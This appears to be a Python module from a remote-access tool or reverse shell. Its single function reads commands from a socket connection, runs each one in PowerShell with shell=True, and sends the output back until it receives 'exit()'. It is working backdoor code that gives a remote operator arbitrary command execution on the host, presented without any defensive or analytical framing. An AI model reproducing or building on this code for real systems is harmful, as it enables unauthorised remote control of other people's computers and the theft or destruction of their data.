import subprocess


def executeCommand(socket):
    print("[+] Executing commands ")
    while True:
        userCommand = socket.ReceiveData()
        print(userCommand)
        
        if userCommand == "exit()":
            break
        
        output = subprocess.run(["powershell", userCommand], shell=True, capture_output=True)
        # print(output, "\n\n")
        if output.stderr.decode("utf-8") == "":
            cmdResult = output.stdout.decode("utf-8")
        else:
            cmdResult = output.stderr.decode("utf-8")
        
        # serilization = [data bytes] + delimeter bytes ["<END_OF_RESULT>"]
        
        socket.SendData(cmdResult)
        
    
    